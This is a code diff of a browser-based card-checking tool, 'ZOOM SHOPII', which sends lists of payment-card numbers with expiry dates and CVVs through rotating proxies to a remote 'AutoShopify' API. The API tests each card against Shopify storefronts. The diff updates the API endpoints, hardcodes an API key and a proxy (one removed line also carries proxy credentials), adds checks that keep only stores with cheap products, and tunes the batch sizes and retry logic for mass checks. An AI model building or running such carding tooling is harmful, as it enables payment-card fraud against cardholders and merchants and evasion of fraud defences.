@@ -1008,8 +1008,8 @@
             </div>
             <div class="debug-content" id="debugContent">
                 <div class="log-entry"><span class="time">[INIT]</span> <span class="info">Debug console ready</span></div>
-                <div class="log-entry"><span class="time">[INFO]</span> <span class="info">API: shimmering-celebration-production-7dd0.up.railway.app</span></div>
-                <div class="log-entry"><span class="time">[INFO]</span> <span class="success">✅ Proxy validator supports ALL formats</span></div>
+                <div class="log-entry"><span class="time">[INFO]</span> <span class="info">API: api-production-ca6dc.up.railway.app</span></div>
+                <div class="log-entry"><span class="time">[INFO]</span> <span class="success">✅ AutoShopify API - Key: darkanon</span></div>
             </div>
             <div class="debug-buttons">
                 <button class="btn btn-secondary" onclick="clearDebug()">🗑️ Clear</button>
@@ -1277,14 +1277,14 @@
 
     <script>
         // ================================================================
-        // ZOOM SHOPII - ULTRA FAST EDITION WITH DEBUG
+        // ZOOM SHOPII - AUTO SHOPIFY API INTEGRATION
         // ================================================================
 
         // ===== CONFIGURATION =====
         const CONFIG = {
-            API_SERVERS: ['https://api-production-6b6d.up.railway.app'],
+            API_SERVERS: ['https://api-production-ca6dc.up.railway.app'],
             CHECKER_API_KEY: 'darkanon',
-            DEFAULT_PROXY: 'd1lgsabwmptd:9ki0plorgc80q50@216.26.231.190:3129',
+            DEFAULT_PROXY: '185.191.239.248:3128',
             ANDROID_UA: 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36'
         };
 
@@ -1324,8 +1324,8 @@
         async function testAPI() {
             logDebug('🔍 Testing API connection...', 'info');
             try {
-                const url = CONFIG.API_SERVERS[0] + '/check?site=shopify.com&key=' + CONFIG.CHECKER_API_KEY;
-                logDebug(`📡 Requesting: ${url.substring(0, 80)}...`, 'info');
+                const url = CONFIG.API_SERVERS[0] + '/check?site=https://katandgracie.com&cc=4111111111111111|12|26|123&proxy=' + encodeURIComponent(CONFIG.DEFAULT_PROXY) + '&key=' + CONFIG.CHECKER_API_KEY;
+                logDebug(`📡 Requesting: ${url.substring(0, 100)}...`, 'info');
                 const response = await fetch(url, {
                     headers: { 'User-Agent': CONFIG.ANDROID_UA, 'Accept': 'application/json' }
                 });
@@ -1333,7 +1333,13 @@
                 if (response.ok) {
                     const data = await response.json();
                     logDebug(`📄 Response: ${JSON.stringify(data).substring(0, 150)}`, 'raw');
-                    logDebug('✅ API is reachable!', 'success');
+                    if (data.valid === true && data.product) {
+                        logDebug(`✅ API is reachable! Product: ${data.product} - $${data.price}`, 'success');
+                    } else if (data.valid === true && !data.product) {
+                        logDebug(`⚠️ API reachable but NO PRODUCT found (NO_CHEAP_PRODUCTS)`, 'warning');
+                    } else {
+                        logDebug(`⚠️ API reachable but site appears dead`, 'warning');
+                    }
                 } else {
                     logDebug('❌ API returned error status!', 'error');
                 }
@@ -1347,8 +1353,8 @@
             const proxy = CONFIG.DEFAULT_PROXY;
             logDebug(`🔌 Proxy: ${proxy.substring(0, 30)}...`, 'info');
             try {
-                const url = CONFIG.API_SERVERS[0] + '/check?site=shopify.com&key=' + CONFIG.CHECKER_API_KEY + '&proxy=' + encodeURIComponent(proxy);
-                logDebug(`📡 Testing: ${url.substring(0, 80)}...`, 'info');
+                const url = CONFIG.API_SERVERS[0] + '/check?site=https://katandgracie.com&cc=4111111111111111|12|26|123&proxy=' + encodeURIComponent(proxy) + '&key=' + CONFIG.CHECKER_API_KEY;
+                logDebug(`📡 Testing: ${url.substring(0, 100)}...`, 'info');
                 const response = await fetch(url, {
                     headers: { 'User-Agent': CONFIG.ANDROID_UA, 'Accept': 'application/json' }
                 });
@@ -1356,7 +1362,11 @@
                 if (response.ok) {
                     const data = await response.json();
                     logDebug(`📄 Response: ${JSON.stringify(data).substring(0, 150)}`, 'raw');
-                    logDebug('✅ Proxy test completed!', 'success');
+                    if (data.valid === true && data.product) {
+                        logDebug(`✅ Proxy working! Product: ${data.product}`, 'success');
+                    } else {
+                        logDebug(`⚠️ Proxy reached API but no product found`, 'warning');
+                    }
                 } else {
                     logDebug('❌ Proxy test failed!', 'error');
                 }
@@ -1486,11 +1496,11 @@
             els.dashSites.textContent = state.sites.length;
             els.dashProxies.textContent = state.proxies.length;
             els.siteTotalDisplay.textContent = state.sites.length;
-            els.siteLiveDisplay.textContent = state.sites.length;
-            els.siteDeadDisplay.textContent = 0;
+            els.siteLiveDisplay.textContent = state.sites.filter(s => s.status === 'ALIVE').length;
+            els.siteDeadDisplay.textContent = state.sites.filter(s => s.status === 'DEAD').length;
             els.proxyTotalDisplay.textContent = state.proxies.length;
-            els.proxyLiveDisplay.textContent = state.proxies.length;
-            els.proxyDeadDisplay.textContent = 0;
+            els.proxyLiveDisplay.textContent = state.proxies.filter(p => p.status === 'ALIVE').length;
+            els.proxyDeadDisplay.textContent = state.proxies.filter(p => p.status === 'DEAD').length;
             els.hitTotalDisplay.textContent = totalHits;
             saveState();
         }
@@ -1500,12 +1510,10 @@
             const trimmed = line.trim();
             if (!trimmed) return false;
 
-            // FORMAT 1: user:pass@host:port (with IP or Domain)
             if (/^[^:]+:[^@]+@[a-zA-Z0-9\-\.]+:\d+$/.test(trimmed)) return true;
 
             const parts = trimmed.split(':');
 
-            // FORMAT 2: host:port:user:pass (host can be IP or Domain)
             if (parts.length === 4) {
                 const host = parts[0];
                 const port = parts[1];
@@ -1514,7 +1522,6 @@
                 if ((isIP || isDomain) && !isNaN(port) && port > 0 && port < 65536) return true;
             }
 
-            // FORMAT 3: host:port (with IP or Domain)
             if (parts.length === 2) {
                 const host = parts[0];
                 const port = parts[1];
@@ -1523,7 +1530,6 @@
                 if ((isIP || isDomain) && !isNaN(port) && port > 0 && port < 65536) return true;
             }
 
-            // FORMAT 4: host:port@user:pass (rare but supported)
             if (trimmed.includes('@')) {
                 const atParts = trimmed.split('@');
                 if (atParts.length === 2) {
@@ -1541,7 +1547,6 @@
                 }
             }
 
-            // FORMAT 5: With protocol prefix
             const protoMatch = trimmed.match(/^(socks5|socks4|http|https):\/\/(.+)$/i);
             if (protoMatch) {
                 const rest = protoMatch[2];
@@ -1628,56 +1633,56 @@
 
         // ===== RENDER SITES =====
         function renderSites() {
-    if (state.sites.length === 0) {
-        els.siteList.innerHTML = '<div class="list-item" style="color:var(--text-dim);">No sites uploaded yet</div>';
-        els.liveSiteCount.textContent = '0';
-        return;
-    }
-    
-    let html = `
-        <div class="list-header">
-            <span class="col-num">#</span>
-            <span class="col-left">Site URL</span>
-            <span class="col-right">
-                <span class="h-status">Product</span>
-                <span class="h-latency">Price</span>
-                <span class="h-added">Added</span>
-                <span class="h-actions"></span>
-            </span>
-        </div>
-    `;
-    
-    state.sites.forEach((s, index) => {
-        let siteUrl = s.url || s;
-        let status = s.status || 'ALIVE';
-        let price = s.price || '0.00';
-        let product = s.product || 'N/A';
-        let added = s.added || new Date().toLocaleDateString();
-        
-        const statusClass = status === 'ALIVE' ? 'status-alive' : 'status-dead';
-        const displayUrl = siteUrl.length > 35 ? siteUrl.slice(0, 35) + '...' : siteUrl;
-        const displayProduct = product.length > 25 ? product.slice(0, 25) + '...' : product;
-        
-        html += `
-            <div class="list-item-row">
-                <span class="row-num">${index + 1}</span>
-                <span class="row-left" title="${siteUrl}">${displayUrl}</span>
-                <span class="row-right">
-                    <span class="r-status ${statusClass}" title="${product}">${displayProduct}</span>
-                    <span class="r-latency">$${price}</span>
-                    <span class="r-added">${added}</span>
-                    <span class="r-actions">
-                        <button class="btn-icon btn-retest" onclick="retestSite(${index})" title="Retest site">🔄</button>
-                        <button class="btn-icon btn-remove" onclick="removeSite(${index})" title="Remove site">❌</button>
+            if (state.sites.length === 0) {
+                els.siteList.innerHTML = '<div class="list-item" style="color:var(--text-dim);">No sites uploaded yet</div>';
+                els.liveSiteCount.textContent = '0';
+                return;
+            }
+            
+            let html = `
+                <div class="list-header">
+                    <span class="col-num">#</span>
+                    <span class="col-left">Site URL</span>
+                    <span class="col-right">
+                        <span class="h-status">Product</span>
+                        <span class="h-latency">Price</span>
+                        <span class="h-added">Added</span>
+                        <span class="h-actions"></span>
                     </span>
-                </span>
-            </div>
-        `;
-    });
-    
-    els.siteList.innerHTML = html;
-    els.liveSiteCount.textContent = state.sites.length;
-}
+                </div>
+            `;
+            
+            state.sites.forEach((s, index) => {
+                let siteUrl = s.url || s;
+                let status = s.status || 'ALIVE';
+                let price = s.price || '0.00';
+                let product = s.product || 'N/A';
+                let added = s.added || new Date().toLocaleDateString();
+                
+                const statusClass = status === 'ALIVE' ? 'status-alive' : 'status-dead';
+                const displayUrl = siteUrl.length > 35 ? siteUrl.slice(0, 35) + '...' : siteUrl;
+                const displayProduct = product.length > 25 ? product.slice(0, 25) + '...' : product;
+                
+                html += `
+                    <div class="list-item-row">
+                        <span class="row-num">${index + 1}</span>
+                        <span class="row-left" title="${siteUrl}">${displayUrl}</span>
+                        <span class="row-right">
+                            <span class="r-status ${statusClass}" title="${product}">${displayProduct}</span>
+                            <span class="r-latency">$${price}</span>
+                            <span class="r-added">${added}</span>
+                            <span class="r-actions">
+                                <button class="btn-icon btn-retest" onclick="retestSite(${index})" title="Retest site">🔄</button>
+                                <button class="btn-icon btn-remove" onclick="removeSite(${index})" title="Remove site">❌</button>
+                            </span>
+                        </span>
+                    </div>
+                `;
+            });
+            
+            els.siteList.innerHTML = html;
+            els.liveSiteCount.textContent = state.sites.filter(s => s.status === 'ALIVE').length;
+        }
 
         // ===== RENDER PROXIES =====
         function renderProxies() {
@@ -1734,7 +1739,7 @@
             });
             
             els.proxyList.innerHTML = html;
-            els.liveProxyCount.textContent = state.proxies.length;
+            els.liveProxyCount.textContent = state.proxies.filter(p => p.status === 'ALIVE').length;
         }
 
         // ===== UPDATE FILTER COUNTS =====
@@ -1771,39 +1776,39 @@
         }
 
         async function retestSite(index) {
-    const site = state.sites[index];
-    if (!site) return;
-    
-    if (state.proxies.length === 0) {
-        alert('❌ No proxies available to test!');
-        return;
-    }
-    
-    const proxy = state.proxies[Math.floor(Math.random() * state.proxies.length)];
-    const siteUrl = typeof site === 'object' ? site.url : site;
-    
-    logDebug(`🔄 Retesting site: ${siteUrl}`, 'info');
-    const result = await testSiteWithPrice(siteUrl, proxy);
-    
-    if (result.status === 'alive' && result.product) {
-        state.sites[index] = {
-            url: siteUrl,
-            status: 'ALIVE',
-            price: result.price.toFixed(2),
-            product: result.product,
-            gateway: result.gateway || 'Shopify Payments',
-            added: new Date().toLocaleDateString()
-        };
-        logDebug(`✅ Site ALIVE: ${siteUrl} - ${result.product} - $${result.price.toFixed(2)}`, 'success');
-        alert(`✅ Site is ALIVE!\nProduct: ${result.product}\nPrice: $${result.price.toFixed(2)}`);
-    } else {
-        state.sites.splice(index, 1);
-        logDebug(`❌ Site DEAD or NO PRODUCT: ${siteUrl}`, 'error');
-        alert('❌ Site is DEAD or has NO PRODUCT!');
-    }
-    renderSites();
-    updateStats();
-}
+            const site = state.sites[index];
+            if (!site) return;
+            
+            if (state.proxies.length === 0) {
+                alert('❌ No proxies available to test!');
+                return;
+            }
+            
+            const proxy = state.proxies[Math.floor(Math.random() * state.proxies.length)];
+            const siteUrl = typeof site === 'object' ? site.url : site;
+            
+            logDebug(`🔄 Retesting site: ${siteUrl}`, 'info');
+            const result = await testSiteWithPrice(siteUrl, proxy);
+            
+            if (result.status === 'alive' && result.product) {
+                state.sites[index] = {
+                    url: siteUrl,
+                    status: 'ALIVE',
+                    price: result.price.toFixed(2),
+                    product: result.product,
+                    gateway: result.gateway || 'Shopify Payments',
+                    added: new Date().toLocaleDateString()
+                };
+                logDebug(`✅ Site ALIVE: ${siteUrl} - ${result.product} - $${result.price.toFixed(2)}`, 'success');
+                alert(`✅ Site is ALIVE!\nProduct: ${result.product}\nPrice: $${result.price.toFixed(2)}`);
+            } else {
+                state.sites.splice(index, 1);
+                logDebug(`❌ Site DEAD or NO PRODUCT: ${siteUrl}`, 'error');
+                alert('❌ Site is DEAD or has NO PRODUCT!');
+            }
+            renderSites();
+            updateStats();
+        }
 
         // ===== PROXY ACTIONS =====
         function removeProxy(index) {
@@ -1947,7 +1952,8 @@
                 'gateway error', 'internal server error', 'server error',
                 'page not found', 'not found', 'http 500', 'http 502',
                 'http 503', 'http 504', 'cloudflare error', 'cf-error',
-                'cf-ray', 'challenge required', 'blocked', 'access blocked'
+                'cf-ray', 'challenge required', 'blocked', 'access blocked',
+                'no_cheap_products', 'no product found', 'throttled'
             ];
             for (const kw of deadKeywords) {
                 if (r.includes(kw)) return true;
@@ -1956,10 +1962,9 @@
         }
 
         // ================================================================
-        // 🔥 FIXED: CHECK CARD - Handles objects AND strings
+        // 🔥 CHECK CARD - AutoShopify API
         // ================================================================
         async function checkCard(card, site, proxy) {
-            // 🔥 FIX: Handle site as object or string
             if (typeof site === 'object' && site !== null) {
                 site = site.url || site.toString();
             }
@@ -1997,16 +2002,23 @@
                 if (!proxyStr) proxyStr = CONFIG.DEFAULT_PROXY;
                 
                 const apiBase = CONFIG.API_SERVERS[Math.floor(Math.random() * CONFIG.API_SERVERS.length)];
-                const url = `${apiBase}/shopify?site=${site}&key=${CONFIG.CHECKER_API_KEY}&proxy=${encodeURIComponent(proxyStr)}&cc=${card}`;
-                logDebug(`📡 URL: ${url.substring(0, 80)}...`, 'info');
+                // ✅ CORRECT URL FORMAT: site, cc, proxy, key
+                const url = `${apiBase}/shopify?site=${encodeURIComponent(site)}&cc=${encodeURIComponent(card)}&proxy=${encodeURIComponent(proxyStr)}&key=${CONFIG.CHECKER_API_KEY}`;
+                logDebug(`📡 URL: ${url.substring(0, 100)}...`, 'info');
+                
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 30000);
                 
                 const response = await fetch(url, {
+                    signal: controller.signal,
                     headers: {
                         'Accept': 'application/json',
                         'User-Agent': CONFIG.ANDROID_UA,
                         'X-Requested-With': 'XMLHttpRequest'
                     }
                 });
+                
+                clearTimeout(timeoutId);
                 
                 const elapsed = Date.now() - startTime;
                 logDebug(`⏱️ Response time: ${elapsed}ms`, 'info');
@@ -2017,13 +2029,27 @@
                 }
                 
                 const raw = await response.json();
-                logDebug(`📄 Response: ${JSON.stringify(raw).substring(0, 150)}`, 'raw');
+                logDebug(`📄 Response: ${JSON.stringify(raw).substring(0, 200)}`, 'raw');
                 
                 const responseMsg = raw.Response || raw.card_response || '';
                 const price = raw.Price || raw.price || '-';
                 const priceValue = getPriceFromResponse(raw);
                 const priceDisplay = (price !== '-' && price !== 0) ? `$${price}` : '-';
                 const gateway = raw.Gate || raw.Gateway || raw.gate || 'Shopify Payments';
+                
+                // Check for throttled or no product
+                if (responseMsg.includes('THROTTLED') || responseMsg.includes('NO_PRODUCT')) {
+                    logDebug(`⚠️ API returned: ${responseMsg}`, 'warning');
+                    return {
+                        status: 'Site Error',
+                        message: responseMsg,
+                        card: card,
+                        retry: true,
+                        gateway: gateway,
+                        price: priceDisplay,
+                        price_value: priceValue
+                    };
+                }
                 
                 if (isSiteDead(responseMsg, gateway, priceDisplay)) {
                     logDebug(`⚠️ Site is dead`, 'warning');
@@ -2096,6 +2122,10 @@
                     };
                 }
             } catch (error) {
+                if (error.name === 'AbortError') {
+                    logDebug(`❌ Request timeout after 30s`, 'error');
+                    return { status: 'Site Error', message: 'Request timeout', card: card, retry: true };
+                }
                 const elapsed = Date.now() - startTime;
                 logDebug(`❌ EXCEPTION after ${elapsed}ms: ${error.message}`, 'error');
                 return {
@@ -2108,7 +2138,7 @@
         }
 
         // ================================================================
-        // 🔥 FIXED: CHECK CARD WITH RETRY - Handles objects
+        // 🔥 CHECK CARD WITH RETRY
         // ================================================================
         async function checkCardWithRetry(card, maxRetries = 5) {
             if (state.sites.length === 0) {
@@ -2121,7 +2151,6 @@
             }
             
             for (let attempt = 0; attempt < maxRetries; attempt++) {
-                // 🔥 FIX: Extract URL from site object
                 const siteObj = state.sites[Math.floor(Math.random() * state.sites.length)];
                 const site = typeof siteObj === 'object' ? siteObj.url : siteObj;
                 
@@ -2132,8 +2161,9 @@
                 const result = await checkCard(card, site, proxy);
                 if (!result.retry) return result;
                 if (attempt < maxRetries - 1) {
-                    logDebug(`⏳ Waiting 100ms before retry...`, 'info');
-                    await new Promise(r => setTimeout(r, 100));
+                    const delay = Math.min(1000 * Math.pow(2, attempt), 5000);
+                    logDebug(`⏳ Waiting ${delay}ms before retry...`, 'info');
+                    await new Promise(r => setTimeout(r, delay));
                 }
             }
             logDebug(`❌ Max retries exceeded for ${maskCard(card)}`, 'error');
@@ -2141,84 +2171,101 @@
         }
 
         // ================================================================
-        // 🔥 FIXED: TEST SITE WITH PRICE - Handles objects
+        // 🔥 TEST SITE WITH PRICE - AutoShopify API
         // ================================================================
-       async function testSiteWithPrice(site, proxy) {
-    if (typeof site === 'object' && site !== null) {
-        site = site.url || site.toString();
-    }
-    if (typeof site !== 'string') {
-        site = String(site);
-    }
-    
-    try {
-        if (!site.startsWith('http')) site = 'https://' + site;
-        
-        let proxyStr = proxy;
-        if (proxy) {
-            if (typeof proxy === 'object' && proxy !== null) {
-                proxyStr = proxy.proxy || proxy.toString();
+        async function testSiteWithPrice(site, proxy) {
+            if (typeof site === 'object' && site !== null) {
+                site = site.url || site.toString();
             }
-            if (typeof proxyStr !== 'string') {
-                proxyStr = String(proxyStr);
+            if (typeof site !== 'string') {
+                site = String(site);
             }
-            const proxyParts = proxyStr.split(':');
-            if (proxyParts.length === 4) {
-                proxyStr = `${proxyParts[0]}:${proxyParts[1]}:${proxyParts[2]}:${proxyParts[3]}`;
-            } else if (proxyParts.length === 2) {
-                proxyStr = `${proxyParts[0]}:${proxyParts[1]}`;
-            }
-        }
-        if (!proxyStr) proxyStr = CONFIG.DEFAULT_PROXY;
-        
-        const testCard = "4111111111111111|12|26|123";
-        const apiBase = CONFIG.API_SERVERS[Math.floor(Math.random() * CONFIG.API_SERVERS.length)];
-        const url = `${apiBase}/check?site=${site}&key=${CONFIG.CHECKER_API_KEY}&proxy=${encodeURIComponent(proxyStr)}&cc=${testCard}`;
-        
-        logDebug(`🔍 Testing site: ${site}`, 'info');
-        const response = await fetch(url, {
-            headers: { 'User-Agent': CONFIG.ANDROID_UA, 'Accept': 'application/json' }
-        });
-        
-        if (!response.ok) {
-            logDebug(`❌ Site test failed: HTTP ${response.status}`, 'error');
-            return { site: site, status: 'dead', price: 0, product: null };
-        }
-        
-        const raw = await response.json();
-        logDebug(`📄 Site response: ${JSON.stringify(raw).substring(0, 150)}`, 'raw');
-        
-        // ✅ CHECK FOR PRODUCT - if valid and has product
-        if (raw.valid === true) {
-            const product = raw.product || raw.Product || null;
-            const price = raw.price || raw.Price || 0;
             
-            // ✅ ONLY ADD IF PRODUCT EXISTS
-            if (product && product !== 'null' && product !== 'undefined' && product.trim() !== '') {
-                logDebug(`✅ Site ALIVE with product: ${product} - $${price}`, 'success');
-                return {
-                    site: site,
-                    status: 'alive',
-                    price: parseFloat(price) || 0,
-                    product: product,
-                    gateway: raw.gate || raw.Gate || 'Shopify Payments',
-                    card_response: raw.card_response || raw.Response || ''
-                };
-            } else {
-                logDebug(`⚠️ Site has NO product: ${site}`, 'warning');
+            try {
+                if (!site.startsWith('http')) site = 'https://' + site;
+                
+                let proxyStr = proxy;
+                if (proxy) {
+                    if (typeof proxy === 'object' && proxy !== null) {
+                        proxyStr = proxy.proxy || proxy.toString();
+                    }
+                    if (typeof proxyStr !== 'string') {
+                        proxyStr = String(proxyStr);
+                    }
+                    const proxyParts = proxyStr.split(':');
+                    if (proxyParts.length === 4) {
+                        proxyStr = `${proxyParts[0]}:${proxyParts[1]}:${proxyParts[2]}:${proxyParts[3]}`;
+                    } else if (proxyParts.length === 2) {
+                        proxyStr = `${proxyParts[0]}:${proxyParts[1]}`;
+                    }
+                }
+                if (!proxyStr) proxyStr = CONFIG.DEFAULT_PROXY;
+                
+                const testCard = "4111111111111111|12|26|123";
+                const apiBase = CONFIG.API_SERVERS[Math.floor(Math.random() * CONFIG.API_SERVERS.length)];
+                const url = `${apiBase}/check?site=${encodeURIComponent(site)}&cc=${encodeURIComponent(testCard)}&proxy=${encodeURIComponent(proxyStr)}&key=${CONFIG.CHECKER_API_KEY}`;
+                
+                logDebug(`🔍 Testing site: ${site}`, 'info');
+                
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 30000);
+                
+                const response = await fetch(url, {
+                    signal: controller.signal,
+                    headers: { 'User-Agent': CONFIG.ANDROID_UA, 'Accept': 'application/json' }
+                });
+                
+                clearTimeout(timeoutId);
+                
+                if (!response.ok) {
+                    logDebug(`❌ Site test failed: HTTP ${response.status}`, 'error');
+                    return { site: site, status: 'dead', price: 0, product: null };
+                }
+                
+                const raw = await response.json();
+                logDebug(`📄 Site response: ${JSON.stringify(raw).substring(0, 200)}`, 'raw');
+                
+                // ✅ CHECK FOR PRODUCT - if valid and has product
+                if (raw.valid === true) {
+                    const product = raw.product || raw.Product || null;
+                    const price = raw.price || raw.Price || 0;
+                    
+                    // ✅ ONLY ADD IF PRODUCT EXISTS
+                    if (product && product !== 'null' && product !== 'undefined' && product.trim() !== '' && product !== 'NO_PRODUCT') {
+                        logDebug(`✅ Site ALIVE with product: ${product} - $${price}`, 'success');
+                        return {
+                            site: site,
+                            status: 'alive',
+                            price: parseFloat(price) || 0,
+                            product: product,
+                            gateway: raw.gate || raw.Gate || 'Shopify Payments',
+                            card_response: raw.card_response || raw.Response || ''
+                        };
+                    } else {
+                        logDebug(`⚠️ Site has NO product: ${site} (${raw.reason || 'NO_CHEAP_PRODUCTS'})`, 'warning');
+                        return { site: site, status: 'dead', price: 0, product: null };
+                    }
+                } else if (raw.valid === false) {
+                    logDebug(`❌ Site is dead: ${site}`, 'error');
+                    return { site: site, status: 'dead', price: 0, product: null };
+                }
+                
+                // Check for throttled or no product
+                if (raw.reason === 'THROTTLED' || raw.reason === 'NO_CHEAP_PRODUCTS') {
+                    logDebug(`⚠️ Site ${raw.reason}: ${site}`, 'warning');
+                    return { site: site, status: 'dead', price: 0, product: null };
+                }
+                
+                return { site: site, status: 'dead', price: 0, product: null };
+            } catch (error) {
+                if (error.name === 'AbortError') {
+                    logDebug(`❌ Site test timeout after 30s: ${site}`, 'error');
+                } else {
+                    logDebug(`❌ Site test error: ${error.message}`, 'error');
+                }
                 return { site: site, status: 'dead', price: 0, product: null };
             }
-        } else if (raw.valid === false) {
-            logDebug(`❌ Site is dead: ${site}`, 'error');
-            return { site: site, status: 'dead', price: 0, product: null };
         }
-        
-        return { site: site, status: 'dead', price: 0, product: null };
-    } catch (error) {
-        logDebug(`❌ Site test error: ${error.message}`, 'error');
-        return { site: site, status: 'dead', price: 0, product: null };
-    }
-}
 
         // ================================================================
         // PROGRESS FILTERS
@@ -2294,11 +2341,11 @@
         });
 
         // ================================================================
-        // QUICK CHECK - ULTRA FAST
+        // QUICK CHECK
         // ================================================================
         async function processQuickCheck() {
             const total = quickCardsList.length;
-            const batchSize = 100;
+            const batchSize = 50;
             
             for (let i = quickCurrentIndex; i < total; i += batchSize) {
                 if (quickStopRequested || quickPaused) {
@@ -2315,7 +2362,7 @@
                 const results = await Promise.all(batch.map(async (line) => {
                     const cardData = parseCardLine(line);
                     if (!cardData) return null;
-                    const result = await checkCardWithRetry(cardData.raw, 5);
+                    const result = await checkCardWithRetry(cardData.raw, 3);
                     if (result.card && !result.card.includes('|')) {
                         const parts = result.card.split('|');
                         if (parts.length === 4) result.card = parts[0];
@@ -2391,7 +2438,7 @@
                 updateStats();
                 renderHits();
                 
-                if (!quickStopRequested) await new Promise(r => setTimeout(r, 30));
+                if (!quickStopRequested) await new Promise(r => setTimeout(r, 500));
             }
             
             if (!quickStopRequested && quickCurrentIndex >= total) {
@@ -2492,11 +2539,11 @@
         });
 
         // ================================================================
-        // MASS CHECK - ULTRA FAST
+        // MASS CHECK
         // ================================================================
         async function processMassCheck() {
             const total = massCardsList.length;
-            const batchSize = 200;
+            const batchSize = 100;
             
             for (let i = massCurrentIndex; i < total; i += batchSize) {
                 if (massStopRequested || massPaused) {
@@ -2513,7 +2560,7 @@
                 const results = await Promise.all(batch.map(async (line) => {
                     const cardData = parseCardLine(line);
                     if (!cardData) return null;
-                    const result = await checkCardWithRetry(cardData.raw, 5);
+                    const result = await checkCardWithRetry(cardData.raw, 3);
                     if (result.card && !result.card.includes('|')) {
                         const parts = result.card.split('|');
                         if (parts.length === 4) result.card = parts[0];
@@ -2601,7 +2648,7 @@
                 updateStats();
                 renderHits();
                 
-                if (!massStopRequested) await new Promise(r => setTimeout(r, 30));
+                if (!massStopRequested) await new Promise(r => setTimeout(r, 500));
             }
             
             if (!massStopRequested && massCurrentIndex >= total) {
@@ -2797,170 +2844,170 @@
         // SITE MANAGER
         // ================================================================
 
-       els.uploadSitesBtn.addEventListener('click', async function() {
-    const file = els.siteFileInput.files[0];
-    if (!file) { alert('Please select a .txt file'); return; }
-    if (state.proxies.length === 0) { alert('❌ No proxies available! Please add proxies first.'); return; }
+        els.uploadSitesBtn.addEventListener('click', async function() {
+            const file = els.siteFileInput.files[0];
+            if (!file) { alert('Please select a .txt file'); return; }
+            if (state.proxies.length === 0) { alert('❌ No proxies available! Please add proxies first.'); return; }
 
-    const reader = new FileReader();
-    reader.onload = async function(e) {
-        const urls = e.target.result.split('\n').map(u => u.trim()).filter(u => u);
-        if (urls.length === 0) { alert('❌ No URLs found in file!'); return; }
-        
-        logDebug(`📁 Processing ${urls.length} sites from file...`, 'info');
-        alert(`🔄 Checking ${urls.length} sites for products...`);
-        
-        const aliveSites = [];
-        let checked = 0;
-        
-        for (const url of urls) {
-            const proxy = state.proxies[Math.floor(Math.random() * state.proxies.length)];
-            const result = await testSiteWithPrice(url, proxy);
-            checked++;
+            const reader = new FileReader();
+            reader.onload = async function(e) {
+                const urls = e.target.result.split('\n').map(u => u.trim()).filter(u => u);
+                if (urls.length === 0) { alert('❌ No URLs found in file!'); return; }
+                
+                logDebug(`📁 Processing ${urls.length} sites from file...`, 'info');
+                alert(`🔄 Checking ${urls.length} sites for products...`);
+                
+                const aliveSites = [];
+                let checked = 0;
+                
+                for (const url of urls) {
+                    const proxy = state.proxies[Math.floor(Math.random() * state.proxies.length)];
+                    const result = await testSiteWithPrice(url, proxy);
+                    checked++;
+                    
+                    if (result.status === 'alive' && result.product) {
+                        aliveSites.push({
+                            url: url,
+                            status: 'ALIVE',
+                            price: result.price.toFixed(2),
+                            product: result.product,
+                            gateway: result.gateway || 'Shopify Payments',
+                            added: new Date().toLocaleDateString()
+                        });
+                        logDebug(`✅ Added site with product: ${url} - ${result.product}`, 'success');
+                    } else {
+                        logDebug(`❌ Skipped (no product): ${url}`, 'warning');
+                    }
+                    
+                    if (checked % 5 === 0 || checked === urls.length) {
+                        logDebug(`📊 Progress: ${checked}/${urls.length} - ${aliveSites.length} added`, 'info');
+                    }
+                }
+
+                state.sites = [...state.sites, ...aliveSites];
+                state.sites = [...new Map(state.sites.map(item => [item.url, item])).values()];
+                renderSites();
+                updateStats();
+                
+                logDebug(`🌐 Added ${aliveSites.length} sites with products from file (${urls.length - aliveSites.length} skipped)`, 'info');
+                alert(`✅ ${aliveSites.length} sites added with products!\n${urls.length - aliveSites.length} sites skipped (no product).`);
+                els.siteFileInput.value = '';
+            };
+            reader.readAsText(file);
+        });
+
+        els.addManualSitesBtn.addEventListener('click', async function() {
+            const text = els.manualSites.value;
+            if (!text.trim()) { alert('Please paste some sites'); return; }
+            if (state.proxies.length === 0) { alert('❌ No proxies available! Please add proxies first.'); return; }
+
+            const urls = text.split('\n').map(u => u.trim()).filter(u => u);
+            if (urls.length === 0) { alert('❌ No valid URLs found!'); return; }
             
-            if (result.status === 'alive' && result.product) {
-                aliveSites.push({
-                    url: url,
-                    status: 'ALIVE',
-                    price: result.price.toFixed(2),
-                    product: result.product,
-                    gateway: result.gateway || 'Shopify Payments',
-                    added: new Date().toLocaleDateString()
-                });
-                logDebug(`✅ Added site with product: ${url} - ${result.product}`, 'success');
-            } else {
-                logDebug(`❌ Skipped (no product): ${url}`, 'warning');
-            }
+            logDebug(`📝 Processing ${urls.length} manual sites...`, 'info');
+            alert(`🔄 Checking ${urls.length} sites for products...`);
             
-            if (checked % 5 === 0 || checked === urls.length) {
-                logDebug(`📊 Progress: ${checked}/${urls.length} - ${aliveSites.length} added`, 'info');
+            const aliveSites = [];
+            let checked = 0;
+            
+            for (const url of urls) {
+                const proxy = state.proxies[Math.floor(Math.random() * state.proxies.length)];
+                const result = await testSiteWithPrice(url, proxy);
+                checked++;
+                
+                if (result.status === 'alive' && result.product) {
+                    aliveSites.push({
+                        url: url,
+                        status: 'ALIVE',
+                        price: result.price.toFixed(2),
+                        product: result.product,
+                        gateway: result.gateway || 'Shopify Payments',
+                        added: new Date().toLocaleDateString()
+                    });
+                    logDebug(`✅ Added site with product: ${url} - ${result.product}`, 'success');
+                } else {
+                    logDebug(`❌ Skipped (no product): ${url}`, 'warning');
+                }
+                
+                if (checked % 5 === 0 || checked === urls.length) {
+                    logDebug(`📊 Progress: ${checked}/${urls.length} - ${aliveSites.length} added`, 'info');
+                }
             }
-        }
 
-        state.sites = [...state.sites, ...aliveSites];
-        state.sites = [...new Map(state.sites.map(item => [item.url, item])).values()];
-        renderSites();
-        updateStats();
-        
-        logDebug(`🌐 Added ${aliveSites.length} sites with products from file (${urls.length - aliveSites.length} skipped)`, 'info');
-        alert(`✅ ${aliveSites.length} sites added with products!\n${urls.length - aliveSites.length} sites skipped (no product).`);
-        els.siteFileInput.value = '';
-    };
-    reader.readAsText(file);
-});
-       els.addManualSitesBtn.addEventListener('click', async function() {
-    const text = els.manualSites.value;
-    if (!text.trim()) { alert('Please paste some sites'); return; }
